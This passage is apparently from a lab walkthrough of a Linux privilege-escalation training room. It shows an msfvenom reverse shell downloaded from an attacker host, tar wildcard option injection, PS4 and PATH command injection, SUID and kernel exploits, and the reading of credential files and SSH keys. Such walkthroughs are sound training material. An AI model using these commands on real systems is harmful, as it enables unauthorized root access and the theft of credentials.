The `tar` command appears to run with a wildcard signified by the asterisk symbol `*`, that can be exploited if not used properly. According to the `crontab` information, it seems that a backup of the `/home/user/` folder is being made every minute. Researching `tar` at [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) it looks like we can use its command options to spawn an interactive system shell!

<br/>

As instructed, let's create a `.elf` reverse shell using `msfvenon` which we will execute as a `tar` informative option later on.

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT -f elf -o shell.elf
```

![image](https://user-images.githubusercontent.com/14150485/172459683-553b1f6b-cfe8-48d5-9db6-e60f546338e6.png)

Now let's set up a temporary python server so we can download the file from the target machine:

```
python3 -m http.server LOCAL_PORT
```

![image](https://user-images.githubusercontent.com/14150485/172460555-5eb9b9e4-27f4-47c5-a37d-06c5b5efdc20.png)

Now switch to the target machine shell and pull the file using the `wget` command:

```
wget LOCAL_IP:LOCAL_PORT/shell.elf
```

![image](https://user-images.githubusercontent.com/14150485/172460876-ead4222e-b8e4-4362-94bd-b99c3ff8913f.png)

After successfully downloading the file, we need to ensure it is an executable:

```
chmod +x shell.elf
```

![image](https://user-images.githubusercontent.com/14150485/172461015-016fc8cf-a4ce-4931-952b-1828c3a4d824.png)

Create the following files in the `/home/user` directory as instructed on the task:

```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

The files we just created are valid `tar` informative output options, which we can also confirm using the `tar --help` command. Once the `tar` cron job runs, the wildcard `*` will include these files and since both filenames are valid `tar` options they will be recognized and treated as such, rather than filenames.

Next up we need to set up a `netcat` listener locally. Please note that the port number should be the same we used to create the `shell.elf` reverse shell.

```
nc -lvnp LOCAL_PORT
```

After a short wait the cron job runs and the listener picks up the connection to the target:

![image](https://user-images.githubusercontent.com/14150485/172463273-100f35d1-c383-41cc-9914-8c294f084f6e.png)

<br/>

### 10.1: Read and follow along with the above.

```
No answer needed
```

<br/>
<br/>

### 11: SUID / SGID Executables - Known Exploits

<br/>

Find all the SUID/SGID executables on the Debian VM:

```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

![image](https://user-images.githubusercontent.com/14150485/172489473-41db594a-a1ef-4879-b041-868c16edd1fa.png)

Per the instructions on the task, we should look for known exploits related to `/usr/sbin/exim-4.84-3`. Searching for `exim 4.84-3` brings up `CVE-2016-1531` on [Exploit-DB](https://www.exploit-db.com/exploits/39535). We can proceed to download the exploit, however before doing so I found it already located under the `/home/user/tools/exim/` directory of the target system:

```
locate cve-2016-1531
```

![image](https://user-images.githubusercontent.com/14150485/172491693-9d0ed091-9184-422c-9dd1-8d4ba546d5bc.png)

Although the specified location was not available, I was able to `find` a copy of it under the `/home/user/tools/suid/exim/` folder:

```
find /home -name 'cve*'
```

![image](https://user-images.githubusercontent.com/14150485/172494315-8d4ff762-dced-47d5-8455-35b001c0b547.png)

Running the exploit will spawn a root shell.

```
/home/user/tools/suid/exim/cve-2016-1531.sh
```

![image](https://user-images.githubusercontent.com/14150485/172493140-bdd047d2-32a8-4560-ba25-bd5b48954928.png)

<br/>

#### 11.1: Read and follow along with the above.

```
No answer needed
```

<br/>
<br/>

### 12: SUID / SGID Executables - Shared Object Injection

<br/>

In this task, the `/usr/local/bin/suid-so` SUID executable is vulnerable to shared object injection. Upon executing the file we notice it is `calculating something`, a progress bar advancing to 99% and the program exiting with the message `Done.`:

```
/usr/local/bin/suid-so
```

![image](https://user-images.githubusercontent.com/14150485/172702194-3840343c-d0ff-4d75-b521-75738a22ba75.png)

The `strace` command will help us stack trace all the libraries and files accessed by the executable. Let's run the command with the options provided on the task:

```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

![image](https://user-images.githubusercontent.com/14150485/172703331-10421e49-816f-42e6-b0fc-2d70b7e8b4ce.png)

Apparently, there is a `libcalc.so` file in one of the `/home/user/` subdirectories, however upon attempting to access it the file cannot be found:

```
cat /home/user/.config/libcalc.so
```

![image](https://user-images.githubusercontent.com/14150485/172703772-eaf837b7-4f8c-47ed-880c-28a5e3918280.png)

We can `find` the file in the `/home/user/.config/` folder and make a copy of it to another location:

```
find /home -name 'libcalc*'
```

![image](https://user-images.githubusercontent.com/14150485/172703975-126c8caf-5902-4c86-8867-ce9d684b1bc6.png)

For the purposes of this task we will stick to the instructions and create a new folder:

```
mkdir /home/user/.config 
```

Now we can proceed to create a shared object in the directory the `/usr/local/bin/suid-so` executable was looking in:

```
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

Running it again should successfully spawn a root shell for us:

```
/usr/local/bin/suid-so
```

![image](https://user-images.githubusercontent.com/14150485/172704932-929322e5-ac72-46a4-897e-d08269beef91.png)


<br/>

#### 12.1: Read and follow along with the above.

```
No answer needed
```

<br/>
<br/>

### 13: SUID / SGID Executables - Environment Variables

The `/usr/local/bin/suid-env` executable can be exploited due to it inheriting the user's `PATH` environment variable and attempting to execute programs without specifying an absolute path.

Executing the file seems to start an `apache2httpd` web server:

```
/usr/local/bin/suid-env
```

![image](https://user-images.githubusercontent.com/14150485/172707687-d9b12874-89cf-490d-ae3a-0a8bfc838bda.png)

Let's see if we can find some more information by searching for any `strings` in the executable:

```
strings /usr/local/bin/suid-env 
```

![image](https://user-images.githubusercontent.com/14150485/172707867-8cf57ec6-49b7-4c0b-84f1-c02813a19397.png)

The last line appears to start a `service` called `apache2`.  Searching for a file by that name under the `/home/user/` directory definitely gives us something we can use.

```
find /home -name 'service*'
```

![image](https://user-images.githubusercontent.com/14150485/172708271-f870202f-225c-42c5-a8c6-731c5e5f7cce.png)

Let's create an executable using the `service` file:

```
gcc -o service /home/user/tools/suid/service.c
```

Setting the `PATH` value to the current directory followed by the initial executable will escalate our privileges to root:

```
PATH=.:$PATH /usr/local/bin/suid-env
```

![image](https://user-images.githubusercontent.com/14150485/172709388-89c65bc9-886b-4184-88cf-ebb8ad0656ac.png)

<br/>

#### 13.1: Read and follow along with the above.

```
No answer needed
```

<br/>
<br/>

### 14: SUID / SGID Executables - Abusing Shell Features (#1)

The `/usr/local/bin/suid-env2` executable is identical to `/usr/local/bin/suid-env` except that it uses the absolute path of the service executable `/usr/sbin/service` to start the `apache2` webserver.

We can verify this using the `strings` command:

```
strings /usr/local/bin/suid-env2
```

![image](https://user-images.githubusercontent.com/14150485/172800589-e9706957-6083-4020-a99e-b909541fe4fd.png)

In bash versions <4.2-048 it is possible to define shell functions with names resembling file paths, then export those functions so that they are used instead of any actual executable at that file path. To see the bash version on the target machine:

```
/bin/bash --version
```

![image](https://user-images.githubusercontent.com/14150485/172801031-526a6403-a58f-4d74-a303-e7c205c99b69.png)

The current version is 4.1.52(1)-release, meaning we can indeed define functions with file names. Let's follow the intructions on the task to create one with the name `/usr/sbin/service` that will execute a new bash shell, using option `-p`to ensure permissions are preserved, and then export the function:

```
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

Once done we can proceed to run the  `/usr/local/bin/suid-env2` executable to get our root shell:

![image](https://user-images.githubusercontent.com/14150485/172802087-a853024c-96ae-4fa2-ba0f-b85b3f7f98c0.png)

<br/>

#### 14.1: Read and follow along with the above.

```
No answer needed
```

<br/>
<br/>


### 15: SUID / SGID Executables - Abusing Shell Features (#2)

The example demonstrated in this second part will only work with bash shell versions 4.4 and above.

When in debugging mode, Bash uses the environment variable `PS4` to display an extra prompt for debugging statements.

Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:

```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

![image](https://user-images.githubusercontent.com/14150485/172802831-3042d285-a920-48c9-88b4-b7f3088832b5.png)

This has created a `/tmp/rootbash` executable with SUID that we can use to gain root on the target machine:

```
/tmp/rootbash -p
```

![image](https://user-images.githubusercontent.com/14150485/172803148-e86133a5-86b3-4aed-8972-75567186a9cc.png)



<br/>

#### 15.1: Read and follow along with the above.

```
No answer needed
```

<br/>
<br/>

### 16: Passwords & Keys - History Files

A common error attackers can exploit for privilege escalation purposes is accidental password input on the command line instead of a password prompt, as those are likely to be recorded in a history file. We can view the contents of all the hidden history files in the user's home directory:

```
cat ~/.*history | less
```

![image](https://user-images.githubusercontent.com/14150485/172804198-d2d4e5c6-2ad8-492c-8665-8db3d0f18c4d.png)

Looks like someone attempted to connect to a MySQL server at some point and accidentally left no spaces after the `-u` and `-p` options used for `username` and `password` input espectively, meaning we can attempt to escalate to a higher privilege using this data:

```
su root
```

![image](https://user-images.githubusercontent.com/14150485/172804748-44eab956-525c-461c-91b8-0893fa23ff64.png)

<br/>

#### 16.1: What is the full mysql command the user executed?

<br/>

The full string was printed upon viewing the history file earlier. The answer is:

```
mysql -h somehost.local -uroot -ppassword123
```

<br/>
<br/>

### 17: Passwords & Keys - Config Files

Although not a common occurrence, configuration files can sometimes include passwords in plaintext or otherwise reversible formats attackers can use. For the example in this task we will be using an OpenVPN file, `/home/user/myvpn.ovpn`. Let's view its contents:

```
cat /home/user/myvpn.ovpn
```

![image](https://user-images.githubusercontent.com/14150485/172807177-d581bb64-305b-44d4-ba14-b57203dd4bd4.png)

What we find is an `auth-user-pass` reference pointing at the `/etc/openvpn/auth.txt` file, the contents of which most likely hold valuable information.

```
cat /etc/openvpn/auth.txt
```

![image](https://user-images.githubusercontent.com/14150485/172807585-04a1dd7e-7da4-49ea-a9e5-9952f50cd1e1.png)

This should suffice for us to escalate to root:

```
su root
```

![image](https://user-images.githubusercontent.com/14150485/172807808-10a9efad-e79a-4734-883a-0cbb1eea093f.png)

<br/>

#### 17.1: What file did you find the root user's credentials in? 

```
/etc/openvpn/auth.txt
```

<br/>
<br/>

### 18: Passwords & Keys - SSH Keys

One of the most common mistakes attackers take advantage of to escalate privileges is incorrect file permissions. In this task we will be searching for hidden files that we can use to gain root access. Let's list the contents of the root directory:

```
ls -la /
```

![image](https://user-images.githubusercontent.com/14150485/172809353-d8c075e8-0dfa-4aac-8b8e-ea31bf657a11.png)

There is a hidden folder called `.ssh`.

```
ls -la /.ssh
```
![image](https://user-images.githubusercontent.com/14150485/172810277-5f26f18d-769b-407d-a068-9123814d86c7.png)

A file called `root_key` is located under this directory, which upon inspection using the `file` command appears to be an RSA private key, typically used for authentication purposes with SSH.

![image](https://user-images.githubusercontent.com/14150485/172810791-3ae954a2-1b09-42fc-a0af-e37e1fd17e60.png)

We can view the file contents and copy them over to a newly created file on our machine that we can use to connect to the target via SSH. Please ensure the permissions of this file are sufficient, otherwise SSH will refuse to use it:

```
chmod 600 root_key
```

![image](https://user-images.githubusercontent.com/14150485/172824993-2a2bd3ca-f02a-4880-a82e-08026b8e0f2c.png)

Now we can connect to the target via `ssh` from our machine using the RSA file:

```
ssh -i FILE_NAME root@TARGET_IP
```

![image](https://user-images.githubusercontent.com/14150485/172825171-eb5f6482-405b-4278-93bb-9ca99a5cfc5e.png)

<br/>

#### 18.1: Read and follow along with the above.

```
No answer needed
```

<br/>
<br/>

### 19: NFS

Files created via NFS inherit the remote user's ID. If the user is root and root squashing is enabled, the ID will instead be set to `nobody`. We can check the NFS configuration on this machine:

```
cat /etc/exports
```

![image](https://user-images.githubusercontent.com/14150485/172826152-e0de3b10-ea9d-4fa9-a9fb-5ada8866a28f.png)

Root squashing on the `/tmp` share seems to be disabled. Follow the instructions to switch to root:

```
su root
```

Now as root on our local machine we will be creating a mount point that we can use to mount the `/tmp` share - Please note that `vers=3` worked for me when mounting the share:

```
mkdir /tmp/nfs
mount -o rw,vers=2 REMOTE_IP:/tmp /tmp/nfs
```

![image](https://user-images.githubusercontent.com/14150485/172828679-2f6b9150-920c-484f-8cb8-e67566f5421e.png)

Follow the instructions to generate an `mfsvenom` payload in the mounted share:

```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

![image](https://user-images.githubusercontent.com/14150485/172828996-2201ee3b-3804-48a7-8b62-7f40d8b99b8b.png)

Now set SUID permissions on the payload file:

```
chmod +xs /tmp/nfs/shell.elf
```

![image](https://user-images.githubusercontent.com/14150485/172829165-568c0701-f950-4a72-a3ee-ca05430afb34.png)

Running the payload from the target machine will escalate the privileges to root:

```
/tmp/shell.elf
```

![image](https://user-images.githubusercontent.com/14150485/172829346-0bee6d14-7cd5-4925-84ca-03a6cfc026e3.png)

<br/>

#### 19.1: What is the name of the option that disables root squashing?

```
no_root_squash
```

<br/>
<br/>

### 20: Kernel Exploits

Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort. In this task we will be running the `Linux Exploit Suggester 2` tool to identify potential kernel exploits on the target system:

```
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
```

The `Dirty COW` exploit comes up on the list. An exploit for this can be found under `/home/user/tools/kernel-exploits/dirtycow/c0w.c`. The xploit essentially replaces the SUID file `/usr/bin/passwd` with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak). Let's proceed to compile the code and run it.

```gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
```

![image](https://user-images.githubusercontent.com/14150485/172830885-11c951bc-b68e-4300-a9d2-392227275ce6.png)

Once the exploit finishes running, executing `/usr/bin/passwd` will spawn a root shell:

```
/usr/bin/passwd
```

![image](https://user-images.githubusercontent.com/14150485/172830971-f30be9c9-3968-42cb-920f-0d0db0720d4b.png)

<br/>

Remember to restore the original `/usr/bin/passwd` file and exit the root shell before continuing!

```
mv /tmp/bak /usr/bin/passwd
exit
```

<br/>

#### 20.1: Read and follow along with the above.

```
No answer needed
```

<br/>
<br/>

### 21: Privilege Escalation Scripts



<br/>

#### 21.1: Experiment with all three tools, running them with different options. Do all of them identify the techniques used in this room?

<br/>

The scripts are located under the `/home/user/tools/privesc-scripts` folder. Running them and examining their outputs we notice that they picked up most of the scenarios we worked on in this room. While scripts are useful and provide detailed information with minimal effort from us, understanding how Linux systems work and how we can manually take advantage of misconfigurations for privilege escalation purposes is key knowledge that takes a significant amount of time, practice and exposure to achieve.

```
No answer needed
```

<br/>
